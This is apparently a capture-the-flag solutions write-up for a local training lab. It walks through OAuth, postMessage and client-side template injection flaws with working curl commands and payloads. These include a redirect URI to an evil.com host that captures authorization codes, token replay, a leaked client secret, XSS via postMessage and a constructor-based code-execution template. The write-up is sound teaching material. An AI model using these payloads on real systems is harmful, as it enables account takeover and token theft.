# PenTrix VulnLab Solutions: Batch 11 (OAuth, postMessage, CSTI)

All labs were verified end-to-end on a local boot (`PORT=3111`, fresh DB) with curl.
Flags are session-scoped: `PENTRIX{<module>_<vuln>}`. For the OAuth labs, keep the
session cookie (cookie jar) through every step. `http://app.pentrix.lab` is a
fictional host used by the lab, so issued codes/tokens are shown on the approval
pages instead of being followed through a real redirect.

---

## oauth – OAuth Flaws

**1. Redirect URI Prefix Bypass** – `PENTRIX{oauth_redirect-bypass}`

1. Log in to the IdP as alice: `GET /oauth/login/alice`.
2. Open the authorization URL with an attacker-controlled redirect URI that still
   starts with the trusted prefix:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=http%3A%2F%2Fapp.pentrix.lab.evil.com%2Fcb&response_type=code&scope=read
   ```
   The prefix check `redirect_uri.startsWith("http://app.pentrix.lab")` passes
   because the string starts with the prefix even though the host is
   `app.pentrix.lab.evil.com`.
3. Approve the request. The approval page shows the flag: the IdP issued a code
   and redirected it to a foreign host.
   Equivalent curl (with the cookie jar from step 1):
   ```
   curl -b jar -c jar -X POST --data "client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read" http://localhost:3111/oauth/idp/approve
   ```
   (fields copied from the hidden inputs on the authorize page)
Why it works: redirect validation uses a naive string-prefix check instead of an
exact match against the registered URI, so `http://app.pentrix.lab.evil.com/cb`
passes and the code leaves for the attacker host.

**2. Authorization Code Leaked in Server Log** – `PENTRIX{oauth_code-leak}`

1. Open `GET /oauth/idp/log`. Every issued code is written there in clear, and a
   recent login by alice is pre-seeded. Copy her code, e.g.
   `code=de0b4b47e4dba33240d038d55ef17d9b`.
2. Log in to the IdP as bob (a different user) and exchange her code directly:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<alice-code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains `access_token` and `flag: PENTRIX{oauth_code-leak}`.
   (`pentrix-spa` is a public client, so no secret is needed.)
Why it works: codes are secrets, but the IdP logs them to a world-readable log,
and the token endpoint accepts a code whose owner differs from the requester.

**3. Login CSRF (Missing state Parameter)** – `PENTRIX{oauth_no-state}`

1. As the attacker, log in to the IdP as bob and open
   `GET /oauth/no-state/attacker`. It mints a code for bob's account and prints
   a malicious link like `/oauth/client/callback?code=<bob-code>`.
2. As the victim (a session logged in to the IdP as alice), visit that link:
   ```
   curl -b jar-alice -c jar-alice "http://localhost:3111/oauth/client/callback?code=<bob-code>"
   ```
   The response shows `PENTRIX{oauth_no-state}` and explains that the client
   session is now bob while the IdP session is alice: alice is logged in to the
   client **as the attacker**.
Why it works: the client callback exchanges any `code` it is given and never
validates a `state` parameter, so an attacker-minted code silently logs the
victim in under the attacker's account.

**4. Implicit Flow Token in URL Fragment** – `PENTRIX{oauth_implicit}`

1. As the victim (alice), run the implicit flow and approve it:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc client host>&response_type=token&scope=read
   ```
   Copy the resulting fragment, e.g. `#access_token=b096f586dc18...&token_type=Bearer`.
2. Simulate the victim browser landing on the callback URL with that fragment.
   The in-lab page records the full URL in browser history; equivalent curl:
   ```
   curl -X POST -H 'Content-Type: application/json' \
     --data '{"url":"http://app.pentrix.lab/callback#access_token=<tok>&token_type=Bearer"}' \
     http://localhost:3111/oauth/client/history-log
   ```
3. As the attacker, read `GET /oauth/client/history`, steal the token, and call
   userinfo with it:
   ```
   curl "http://localhost:3111/oauth/idp/userinfo?access_token=<tok>"
   ```
   Response contains `flag: PENTRIX{oauth_implicit}`.
Why it works: the implicit flow puts the access token in the URL fragment, and
fragments are kept in browser history, so anyone who can read the history owns
the token and the IdP accepts it regardless of who presents it.

**5. Scope Tampering** – `PENTRIX{oauth_scope-upgrade}`

1. As bob (a plain user), authorize with a scope you were never granted:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=admin
   ```
   Approve and copy the code.
2. Exchange the code and use the token on the admin-only endpoint:
   ```
   curl -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   curl "http://localhost:3111/oauth/idp/admin-data?access_token=<tok>"
   ```
   Response contains the admin secret and `flag: PENTRIX{oauth_scope-upgrade}`.
Why it works: the authorize endpoint takes `scope` from the request and grants
whatever is asked for without checking the user's role.

**6. Client Secret in Public JavaScript** – `PENTRIX{oauth_secret-in-js}`

1. Download the public bundle: `GET /oauth/client/app.js`. It contains the
   confidential client's secret in clear:
   ```
   var CLIENT_SECRET = 'sk_live_9f2c7b41d8e0a5c6';
   ```
2. As bob, authorize the confidential client (`client_id=pentrix-client`,
   `response_type=code`) and approve; copy the issued code.
3. Exchange the code directly at the token endpoint with the stolen secret:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-client&client_secret=sk_live_9f2c7b41d8e0a5c6&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains `flag: PENTRIX{oauth_secret-in-js}`.
Why it works: a "confidential" client's secret is shipped to every browser in
the public JavaScript bundle, so it is not secret at all and anyone can
complete the confidential-client exchange.

**7. Authorization Code Replay** – `PENTRIX{oauth_code-replay}`

1. As bob, authorize `pentrix-spa` (`response_type=code`) and approve; copy the code.
2. Exchange the same code twice:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Both responses return valid, different access tokens; the second response
   contains `flag: PENTRIX{oauth_code-replay}`.
Why it works: the IdP counts code uses but never invalidates them, so a
single-use code stays valid forever.

**8. PKCE Downgrade** – `PENTRIX{oauth_pkce-skip}`

1. As bob, authorize with a code challenge:
   ```
   /oauth/idp/authorize?client_id=pentrix-spa&redirect_uri=<enc>&response_type=code&scope=read&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256
   ```
   Approve and copy the code.
2. Exchange the code with **no** `code_verifier`:
   ```
   curl -b jar-bob -X POST --data "client_id=pentrix-spa&code=<code>" http://localhost:3111/oauth/idp/token
   ```
   Response contains a valid token and `flag: PENTRIX{oauth_pkce-skip}`.
Why it works: the IdP records the challenge but the token endpoint never
requires the verifier, so PKCE provides no binding at all.

---

## postmsg – postMessage Flaws

Browser steps: each lab pairs a victim page with an in-lab attacker page. Open
the attacker page in your browser, fire the payload, and the victim page's own
JavaScript calls `/postmsg/beacon?v=<lab>&d=...`, which awards the flag. All
five beacons were verified with curl against the served code: the expected
payload format awards the flag; malformed payloads are rejected (lab 2 rejects
a wrong token, lab 5 requires the deletion to have happened).

**1. No Origin Check on Message Handler** – `PENTRIX{postmsg_no-check}`

1. Open `/postmsg/no-check/attacker` in the browser.
2. Click "Fire payload". The attacker page runs:
   ```
   document.getElementById('v').contentWindow.postMessage(
     '<img src=x onerror="document.getElementById(\'log\').textContent=\'XSS via postMessage\'">', '*');
   ```
3. The victim widget's handler writes `e.data` into `innerHTML` with no origin
   check, executes the markup, and beacons `v=no-check`.
Why it works: the `message` listener trusts any sender and renders the payload
as HTML, so any website can inject markup (and scripts) into the victim page.

**2. Secret Leaked via Wildcard targetOrigin** – `PENTRIX{postmsg_wildcard}`

1. Open `/postmsg/wildcard/attacker` in the browser. It embeds the victim
   widget in an iframe.
2. On load, the victim widget runs
   `parent.postMessage({ token: SECRET_TOKEN, from: 'trusted-widget' }, '*')`.
   The attacker page listens, captures `e.data.token`, and beacons
   `v=wildcard&d=wildcard:<token>`. The beacon only awards when the payload
   contains the session's real secret (verified: a wrong token is rejected).
Why it works: `targetOrigin '*'` broadcasts the secret to every embedding page,
including a malicious one, which just listens and forwards it.

**3. Unsanitized Message Data Rendered as HTML** – `PENTRIX{postmsg_data-xss}`

1. Open `/postmsg/data-xss/attacker` in the browser.
2. Click "Fire payload". The attacker page posts an object, not a string:
   ```
   document.getElementById('v').contentWindow.postMessage(
     { html: '<img src=x onerror="alert(\'postMessage XSS\')">' }, '*');
   ```
3. The victim takes `e.data.html` and drops it into `innerHTML` unsanitized,
   then beacons `v=data-xss`.
Why it works: message data is rendered as raw HTML with no sanitization, so an
object-shaped message becomes live markup in the victim page.

**4. Substring Origin Check Bypass** – `PENTRIX{postmsg_substring}`

1. Open `/postmsg/substring/attacker`. The victim checks
   `originToTest.includes('pentrix.lab')`, so an attacker domain containing that
   string passes: `'https://pentrix.lab.evil.com'.includes('pentrix.lab')` is
   true.
2. The lab simulates the attacker origin (`?simulateOrigin=https://pentrix.lab.evil.com`,
   shown in a banner, since a local lab cannot mint DNS origins) and the
   vulnerable `includes()` check itself is the real code under test.
3. Click "Fire payload". The check passes, the HTML is rendered, and the victim
   beacons `v=substring`.
Why it works: a substring match instead of an exact comparison lets
`https://pentrix.lab.evil.com` ride on the trusted string `pentrix.lab`.

**5. Privileged Action via Forged Message** – `PENTRIX{postmsg_csrf-action}`

1. Open `/postmsg/csrf-action/attacker` in the browser. It embeds the victim's
   account settings page.
2. Click "Fire payload". The attacker page posts:
   ```
   document.getElementById('v').contentWindow.postMessage({ action: 'delete-account' }, '*');
   ```
3. The victim handler fires `POST /postmsg/csrf-action/delete` with no origin
   check and no confirmation, deletes the account, and beacons
   `v=csrf-action&d=csrf-action:account-deleted`. The beacon only awards if the
   deletion really happened (verified: pre-deletion beacon is rejected).
   Reset the lab account via `/postmsg/csrf-action/reset`.
Why it works: a state-changing action is driven by any cross-origin message
with no origin verification and no user confirmation, which is CSRF delivered
through postMessage.

---

## csti – Client-Side Template Injection

The server stores your template; the browser evaluates it with a deliberately
naive engine (served in every lab page's source) that replaces `{{ expr }}` and
`[[ expr ]]` by compiling the inside with `Function` and exposes `constructor`
(which is `Object`) to every expression. All five beacons were verified with
curl; the evaluation paths below were additionally proven by extracting the
exact served JavaScript and running it: `{{7*7}}` renders `49`, `[[7*7]]`
renders `49`, and `{{constructor.constructor("return 1+1")()}}` evaluates to `2`.

**1. Basic Template Evaluation** – `PENTRIX{csti_basic}`

1. Open `/csti/basic` and save a greeting containing an expression, e.g.
   `Hello {{7*7}}!`.
2. The preview renders `Hello 49!`. The page's JavaScript sees `49` in the
   rendered output and beacons `v=basic&d=49`, awarding the flag.
Why it works: `{{ expression }}` is compiled with `Function` and executed, so
any arithmetic (or JavaScript) inside the delimiters evaluates in the victim's
browser.

**2. Filter Bypass via Alternative Delimiter** – `PENTRIX{csti_filter-bypass}`

1. Open `/csti/filter-bypass`. Submitting `{{7*7}}` is rejected with
   "Blocked by the filter" (the server refuses any template containing `{{`
   or `}}`; verified with curl: HTTP 400).
2. The client engine also evaluates a second delimiter syntax the filter never
   heard of. Save `[[7*7]]` instead: it is accepted (HTTP 302) and the preview
   renders `49`, which beacons `v=filter-bypass`.
Why it works: the blacklist is server-side and only knows `{{ }}`, while the
client-side engine evaluates `[[ ]]` too, so the filter and the engine disagree
about what is a template.

**3. Constructor Breakout to Code Execution** – `PENTRIX{csti_constructor}`

1. Open `/csti/constructor`. Every expression can see `constructor` (which is
   `Object`), and `Object.constructor` is `Function`, so a template can compile
   and run arbitrary code.
2. Save this template:
   ```
   {{constructor.constructor("fetch('/csti/beacon?v=constructor&d=' + encodeURIComponent('code-executed'))")()}}
   ```
3. When the preview renders, the expression compiles the string with `Function`
   and runs it; the fetch hits the beacon and awards the flag. Proven against
   the served engine: the payload fires a fetch to exactly
   `/csti/beacon?v=constructor&d=code-executed`.
Why it works: exposing `constructor` in the expression scope hands out `Function`,
turning template evaluation into arbitrary JavaScript execution in the victim's
browser.

**4. CSTI Inside an HTML Attribute** – `PENTRIX{csti_attr}`

1. Open `/csti/attr` and save `{{7*7}}` as the badge text. View source: the
   server entity-encodes it into the `value` attribute.
2. The page's JavaScript reads the attribute back with `getAttribute('value')`
   (which decodes the entities), runs the raw template through `cstiRender`,
   and the badge shows `49`, which beacons `v=attr`.
Why it works: server-side entity encoding only changes how the bytes look in
HTML source; `getAttribute` decodes them back, and encoding never stopped the
client-side engine from evaluating the template.

**5. Stored Template in Profile Name** – `PENTRIX{csti_stored}`

1. Open `/csti/stored` and save `{{7*7}}` as a display name. It is stored in the
   database (`csti_profiles`) and rendered on every view.
2. Reload the member list: every visitor's browser evaluates the stored name
   as a template, the list shows `49`, and the page beacons `v=stored`.
Why it works: stored display names are evaluated as templates on every view, so
the injection persists and fires for every visitor, not just the attacker.
